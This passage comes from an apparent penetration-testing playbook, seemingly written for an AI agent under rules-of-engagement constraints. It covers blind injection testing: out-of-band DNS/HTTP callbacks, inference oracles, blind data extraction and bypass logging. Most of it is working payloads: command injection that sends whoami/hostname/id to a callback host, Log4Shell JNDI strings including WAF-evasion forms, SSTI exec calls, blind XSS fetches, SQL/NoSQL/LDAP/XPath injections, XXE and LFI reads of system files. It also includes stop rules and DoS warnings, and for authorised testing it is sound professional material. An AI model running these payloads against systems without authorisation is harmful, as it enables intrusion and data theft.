Handlebars/Node see 01-injection.md SSTI card; prototype chain varies by version
Thymeleaf      ${T(java.lang.Runtime).getRuntime().exec('nslookup r0087-b-ssti.07.cXXXX.oast.pro')}
Razor/.NET     @System.Diagnostics.Process.Start("nslookup","r0087-b-ssti.08.cXXXX.oast.pro")
```

Always land the arithmetic probe (`{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`) before the OOB one. If `49`
comes back you do not need a callback and you have cleaner evidence.

**Command injection**

```bash
# DNS, portable, quiet
;nslookup r0211-f-cmd.01.cXXXX.oast.pro
|nslookup r0211-f-cmd.02.cXXXX.oast.pro
`nslookup r0211-f-cmd.03.cXXXX.oast.pro`
$(nslookup r0211-f-cmd.04.cXXXX.oast.pro)
&nslookup r0211-f-cmd.05.cXXXX.oast.pro&          # Windows-friendly
%0anslookup r0211-f-cmd.06.cXXXX.oast.pro         # newline injection

# data in the label
;nslookup $(whoami).r0211-f-cmd.07.cXXXX.oast.pro
;nslookup `hostname`.r0211-f-cmd.08.cXXXX.oast.pro
;curl -s http://r0211-f-cmd.09.cXXXX.oast.pro/$(id -u)

# Windows
&nslookup %USERNAME%.r0211-f-cmd.10.cXXXX.oast.pro
&ping -n 1 r0211-f-cmd.11.cXXXX.oast.pro
&powershell -c "Resolve-DnsName r0211-f-cmd.12.cXXXX.oast.pro"
```

Once a callback lands, proof stops at `id` / `whoami` / `hostname` (`CLAUDE.md` 2). Do not enumerate the
filesystem, do not read config files, do not write anything.

RISK: `ping` without a count (`-c 1` / `-n 1`) runs forever on some platforms and is a mild DoS. Always set
the count. Prefer `nslookup`.

**JNDI (Log4Shell-family, Java sinks)**

```
${jndi:ldap://r0142-h-jndi.01.cXXXX.oast.pro/a}
${jndi:dns://r0142-h-jndi.02.cXXXX.oast.pro/a}
${jndi:rmi://r0142-h-jndi.03.cXXXX.oast.pro/a}
${${lower:j}ndi:${lower:l}dap://r0142-h-jndi.04.cXXXX.oast.pro/a}    WAF-evading form
${${::-j}${::-n}${::-d}${::-i}:ldap://r0142-h-jndi.05.cXXXX.oast.pro/a}
${jndi:ldap://${sys:java.version}.r0142-h-jndi.06.cXXXX.oast.pro/a}  version exfil, harmless
```

Put these in headers (`User-Agent`, `X-Forwarded-For`, `Referer`), usernames, and any field that reaches a
log. A DNS hit alone is the finding. Stop there — **never serve a payload class from your LDAP endpoint.**
That is code execution on the target and beyond ROE.

**Deserialization**

```
Java      URLDNS gadget only. Payload resolves a hostname on deserialization. No code runs.
          Detect the format first: base64 starting rO0 (Java), AC ED 00 05 raw, {"@type": (fastjson),
          $type (Json.NET), !!python/object (PyYAML), O:4: (PHP), --- !ruby/object (Ruby).
PHP       phar:// wrappers and __wakeup chains -> use a gadget whose only effect is a hostname lookup
.NET      TypeConfuseDelegate reaches process start; do not use it. Prefer a DNS-only gadget.
Python    pickle/PyYAML reach exec directly; use a payload whose command is nslookup <canary> only.
Node      node-serialize IIFE; command is nslookup <canary> only.
```

Rule for every one of these: the gadget's only effect is a DNS lookup or a single benign command. Never a
reverse shell, never a file write, never a dropper. Generating a `ysoserial` payload with a command other
than `nslookup <canary>` is outside ROE.

RISK: deserialization gadget chains can crash the target process. That is a DoS. Send one, wait, check the
app still answers a normal request, and stop if it does not (`CLAUDE.md` 4).

**Blind XSS**

```html
"><script src=https://r0087-b-xss.01.cXXXX.oast.pro></script>
'><img src=x onerror=this.src='https://r0087-b-xss.02.cXXXX.oast.pro/?c='+document.domain>
<script>fetch('https://r0087-b-xss.03.cXXXX.oast.pro/?d='+encodeURIComponent(document.domain))</script>
javascript:fetch('https://r0087-b-xss.04.cXXXX.oast.pro/?d='+document.domain)
```

Blind XSS is second-order by definition. Plant it in every stored field, then re-crawl the render sites per
`CLAUDE.md` rule 7 and log each canary in the render-site table in `templates/coverage.md`. Exfiltrate
`document.domain` and the URL only — never cookies, tokens, or page content of another user. If a callback
arrives from an admin context, you have the finding; do not ride the session.

Note: XSS is only in scope here as an injection sink per `CLAUDE.md` 1. Keep the write-up framed as
injection.

## B.8 Inference channels when there is no egress

No callbacks ever arrive. That means either no vulnerability or no egress. Distinguish them with an
in-band oracle. The payload must produce a *measurable difference* in the response between a true and a
false condition.

Every oracle needs the baseline from `00-surface-and-ledger.md` 2.4. Without it these channels are noise.

| Channel | Signal | Reliable when | Watch out for |
|---|---|---|---|
| Boolean differential | two distinct responses for true/false | there is any content difference at all | responses that differ for unrelated reasons (CSRF token, timestamp, request ID) — normalise before comparing |
| Response length | byte count | content varies with the condition | gzip, chunked encoding, dynamic ads/nonces. Compare decoded length |
| Status code | 200 vs 500 vs 302 | errors are not swallowed | a WAF answering instead (B.2) |
| Error vs no error | presence of an error string | app leaks a distinguishable error | error text changing between runs |
| Timing | wall-clock delta | no other channel exists | network noise. See discipline below |
| Sort / order | row order changes with an `ORDER BY` you control | a list endpoint with a sortable column | pagination and caching |
| Result count | number of items returned | filterable list endpoint | quietly capped page sizes |
| Cache / conditional | `ETag`, `Last-Modified` change | cacheable responses | CDN caching your own probes — cache-bust with a dummy param |

### Timing discipline

Timing is the least reliable channel and the easiest to fool yourself with. Honest method:

1. Measure the baseline: 10 requests, no payload. Record the **median** and the interquartile range.
2. Choose a delay that clears the noise floor but stays inside ROE: **max 5s**, per `CLAUDE.md` 2.
3. Run the true case 5 times and the false case 5 times, interleaved (T F T F …), not in blocks. Interleaving
   cancels drift.
4. Compare medians, not single samples or means. A single slow response proves nothing.
5. Declare it only if median(true) − median(false) is greater than the baseline IQR and greater than half the
   delay you asked for.
6. **Max 3 time-based probes per parameter** (`CLAUDE.md` 2). Budget accordingly: that is the confirming run
   only. Do the exploring with a boolean oracle.

```bash
# median of 10 baseline requests
for i in $(seq 10); do
  curl -s -o /dev/null -w '%{time_total}\n' 'https://TARGET/api/search?q=hello'
done | sort -n | awk '{a[NR]=$1} END{print "median", (a[5]+a[6])/2}'
```

RISK: time-based probes at scale are a DoS. Every sleeping request holds a DB connection. Never run them
concurrently, never above 5s, never more than 3 per parameter, and never in a wordlist loop.

### Per-sink boolean oracle recipes

Pair every payload with its logical negation and diff the two responses. Never judge one in isolation.

**SQL (numeric context)**

```sql
1 AND 1=1          /  1 AND 1=2
1 AND (SELECT 1)=1 /  1 AND (SELECT 1)=2
1/1                /  1/0                      -- error oracle, no data touched
```

**SQL (string context)**

```sql
' AND '1'='1'-- -            /  ' AND '1'='2'-- -
' AND (SELECT SUBSTR(@@version,1,1))='5'-- -    MySQL
' AND (SELECT SUBSTRING(@@version,1,1))='1'-- -  MSSQL
' AND (SELECT SUBSTR(banner,1,1) FROM v$version WHERE rownum=1)='O'-- -   Oracle
' AND (SELECT substr(version(),1,1))='P'-- -     Postgres
' AND ASCII(SUBSTR((SELECT database()),1,1))>77-- -   binary-search form
```

**SQL time fallback (only after boolean fails, max 3 probes, ≤5s)**

```sql
MySQL      ' AND IF(1=1,SLEEP(3),0)-- -
           ' AND (SELECT 1 FROM (SELECT SLEEP(3))x)-- -
Postgres   ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)IS NOT NULL-- -
MSSQL      '; IF(1=1) WAITFOR DELAY '0:0:3'-- -
Oracle     ' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE 1 END)-- -
SQLite     ' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(20000000))))-- -   RISK: CPU burn, do not use
```

RISK: `BENCHMARK()`, `RANDOMBLOB`, `generate_series`, and heavy `CROSS JOIN` delays burn CPU instead of
sleeping. Those are DoS. Use `SLEEP`/`pg_sleep`/`WAITFOR` only.

**NoSQL / MongoDB**

```json
{"user":"admin","pass":{"$ne":"x"}}          true-ish
{"user":"admin","pass":{"$ne":null}}
{"user":{"$regex":"^a"}}  /  {"user":{"$regex":"^zzzz"}}    char oracle
{"user":{"$gt":""}}       /  {"user":{"$gt":"zzzz"}}
```

RISK: `$where` with a JS loop is a CPU DoS. Use `$regex` prefix matching instead.

**LDAP**

```
*)(objectClass=*     /  *)(objectClass=nosuchclass
admin*)(|(cn=*       prefix oracle on cn
```

**SSTI**

```
{{7*7}} -> 49        /  {{7*'7'}} -> 7777777 (Jinja) vs 49 (Twig)   also fingerprints the engine
${7*7}  ${{7*7}}  #{7*7}  <%= 7*7 %>  @(7*7)
{{ 1==1 }} / {{ 1==2 }}   boolean oracle when arithmetic is filtered
```

**Command injection (no egress)**

```bash
;true   /  ;false                     status or content differential
;test -f /etc/passwd && echo Y        only if output is reflected
&& sleep 3   /   && sleep 0           timing, max 3 probes, ≤5s  RISK: see above
$(echo x)y                            output-merge oracle: response contains "xy"
```

**XPath**

```
' and string-length(name(/*[1]))=4 and '1'='1
' and substring(name(/*[1]),1,1)='u' and '1'='1
```

**XXE with no egress**

```xml
<!-- local DTD reuse triggers a parse error containing the file content -->
<!DOCTYPE r [
 <!ENTITY % local SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
 <!ENTITY % c '<!ENTITY &#x25; f SYSTEM "file:///etc/hostname">'>
 %local; %c; %f;
]><r>&f;</r>
```

Error-based XXE is the only read path with no egress. Keep it to one small file.

**File read / LFI with no output**

```
?file=/etc/passwd        vs    ?file=/etc/nosuchfile      status or length differential
?file=php://filter/convert.base64-encode/resource=index.php   in-band, no egress needed
```

**Second-order with no egress**

If the sink is stored and rendered somewhere you can read (`CLAUDE.md` rule 7), you do not need OOB at all.
Plant a canary, then read the render site yourself. Log it in the render-site table in
`templates/coverage.md`.

## B.9 Blind extraction mechanics

You have an oracle. Now spend as few requests as possible and stop early.

### Binary search vs char-by-char

| | Requests per char | Use when |
|---|---|---|
| Char-by-char (`=` against a charset) | up to 95, avg ~48 | charset is tiny and known (hex, digits) |
| Binary search on `ASCII()` | 7 (for 0-127) | default. Always prefer this |
| Bitwise (`& 1`, `& 2`, …) | 7 (8 for full byte) | same cost, sometimes the only form the filter allows |
| Regex/prefix (`LIKE 'a%'`) | ~log(charset) per char with good tree | NoSQL, LDAP, XPath |
| Chunked hex + binary search | 7 per nibble | when the value is binary |

Binary search form, per DB:

```sql
MySQL      ' AND ASCII(SUBSTR((SELECT database()),1,1))>64-- -
Postgres   ' AND ASCII(SUBSTR((SELECT current_database()),1,1))>64-- -
MSSQL      ' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>64-- -
Oracle     ' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>64-- -
```

Get the length first — it stops you probing past the end:

```sql
' AND LENGTH((SELECT database()))=8-- -        or >4, binary search
```

### Request budget

```
requests = chars * 7  (+1 per char for the length probe, +log2(maxlen) for the length)

  8-char DB name            ~60 requests
  one table name (15)       ~110
  10 column names (~12 ea)  ~850
  one row, 3 fields (~30)   ~220
```

At the `CLAUDE.md` default of 5 req/s that is seconds of traffic — but a rate-limited target at 1 req/s
makes 850 requests a 14-minute job that will look like an attack. Budget before you start:

1. Compute the request count. If it is over ~500 at the current rate limit, reduce the target instead of
   the delay: fewer columns, one table, one value.
2. Prefer in-band over blind wherever possible. A working UNION or error-based extraction does in 3 requests
   what blind does in 300 (`01-injection.md`).
3. Extract metadata that shortens the search: `LENGTH()` first, character set of the value, `COUNT(*)` before
   iterating rows.
4. Watch for 429 throughout (B.6). A binary search that hits a rate limit mid-flight gives wrong answers,
   because a throttled response looks like a false.
5. Re-verify the first and last character at the end. If either disagrees with the extraction, the oracle
   drifted and the whole string is suspect.

### Stop rule

`CLAUDE.md` 2 — no lateral movement, extract schema not contents. Concretely:

| Extract | Do not extract |
|---|---|
| DB name, version, current user | any full table |
| Table names (the ones relevant to the finding) | more than one row of real data |
| Column names for those tables | any password hash, token, API key, or card/PII field |
| `COUNT(*)` of a sensitive table — the number is the impact statement | the contents of that table |
| One value proving read access, ideally your own test account's row | another user's row when your own will do |

Stop at: **schema + one proof value from your own record**. That is a complete, reportable blind SQLi. Write
the row count as the scope-of-exposure line in `templates/finding.md` and stop.

If the only reachable proof value is another user's data, take one field, redact it in the report, and note
in `notes.md` why no self-owned value was available. If you land on credentials or bulk PII,
stop reading and report (`CLAUDE.md` 4).

## B.10 Bypass log discipline

A negative is only trustworthy if it says what was tried. `CLAUDE.md` rule 2: no payload, no negative.

Every bypass attempt goes in the ledger row's `Notes` column in `targets/<target>/coverage.md`. Format:

```
<layer> | <family> | <payload id or literal> | <response: status/len/time> | <verdict>
```

Example run on one row:

```
R0142 | q=search | sqli
  waf(cloudflare) | plain          | ' OR 1=1-- -              | 403/1284/40ms  | blocked
  waf(cloudflare) | double-url     | %2527%2520OR...           | 403/1284/41ms  | blocked
  waf(cloudflare) | json-escape    | {"q":"\u0027 OR 1=1-- -"} | 200/1843/128ms | passed filter, no sqli signal
  waf(cloudflare) | hpp-last       | ?q=x&q=' OR 1=1-- -       | 403/1284/39ms  | blocked
  waf(cloudflare) | ct-mismatch    | json body as form         | 200/1843/121ms | passed filter, no sqli signal
  oob             | dns canary     | r0142-q-sqlmy.01          | 200/1843       | no callback in 10min
  inference       | bool           | 1 AND 1=1 / 1 AND 1=2     | 1843 vs 1843   | no differential
  -> tested-negative (filter bypassed twice, sink did not respond)
```

Rules:

- A row only moves `suspicious` → `tested-negative` when **the filter was bypassed and the sink still did
  not respond**. "WAF blocked everything I tried" stays `suspicious` and goes to the operator
  (`CLAUDE.md` 6.6 and 4).
- Record the canary label for every OOB payload sent, and the time you sent it. Callbacks can arrive hours
  later, from a batch job or an admin opening a page. A canary with no recorded owner is wasted.
- Record the response fingerprint (status/length/time), not "blocked". The fingerprint is what lets you tell
  later that the WAF changed.
- Record which bypass families you did **not** try and why (out of ROE, rate limited, needs a second
  account). That is the handoff to the operator.
- When a bypass works, it usually works on every row behind the same filter. Note it once at the top of
  `notes.md` as the target's working bypass, and reference it from the rows.
